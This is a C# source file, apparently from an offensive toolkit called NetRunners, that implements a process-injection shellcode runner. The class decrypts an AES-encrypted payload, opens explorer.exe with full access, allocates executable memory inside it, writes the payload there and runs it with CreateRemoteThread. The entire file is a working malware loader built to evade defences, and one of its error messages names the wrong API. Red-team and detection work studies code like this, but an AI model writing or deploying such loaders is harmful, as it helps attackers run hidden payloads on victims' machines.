using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using static NetRunners.DecryptionAlgorithms.Decryptor;
using static NetRunners.Data.Delegates;
using static NetRunners.Data.EncryptedData;

namespace NetRunners.Runners
{
    /// <summary>
    /// This class contains the Process Injection Shellcode Runner
    /// </summary>
    public static class PiRunner
    {
        // Process Injection Runner
        public static void Run()
        {
            byte[] buf = Data.EncryptedData.buf;
            int sBuf = Data.EncryptedData.sBuf;       // decrypted buf size
            try
            {
                // get explorer pid
                Process[] explorerProcesses = Process.GetProcessesByName("explorer");
                int explorerPID = explorerProcesses[0].Id;
                if (explorerPID == 0)
                    throw new Exception($"Failed retrieving explorer's PID");


                // open handle to target process 
                IntPtr hProcess = OpenProcess(0x001F0FFF, 0, explorerPID);
                if (hProcess == IntPtr.Zero)
                    throw new InvalidOperationException($"OpenProcess failed with error code: {Marshal.GetLastWin32Error()}");

                // allocate memory on remote process
                IntPtr pRMemory = VirtualAllocEx(hProcess, IntPtr.Zero, (UIntPtr)sBuf, 0x3000, PAGE_EXECUTE_READ);
                if (pRMemory == IntPtr.Zero)
                    throw new InvalidOperationException($"VirtualAlloc failed with error code: {Marshal.GetLastWin32Error()}");

                //decrypt buf
                try
                {
                    buf = DecryptBytesToBytes_Aes(buf, AesKey, AesIV);
                }
                catch (Exception e)
                {
                    throw new InvalidOperationException("Decryption of buffer failed.", e);
                }

                // write to remote process memory
                IntPtr outSize;
                WriteProcessMemory(hProcess, pRMemory, buf, buf.Length, out outSize);
                if (outSize == IntPtr.Zero)
                    throw new InvalidOperationException($"WriteProcessMemory failed with error code: {Marshal.GetLastWin32Error()}");

                // create remote thread to execute shellcode
                IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, pRMemory, IntPtr.Zero, 0, IntPtr.Zero);
                if (hThread == IntPtr.Zero)
                    throw new InvalidOperationException($"WriteProcessMemory failed with error code: {Marshal.GetLastWin32Error()}");
            }
            catch (Exception e)
            {
                // handle error
                Console.WriteLine($"An error occurred: {e.Message}");
                throw;
            }
        }
    }
}
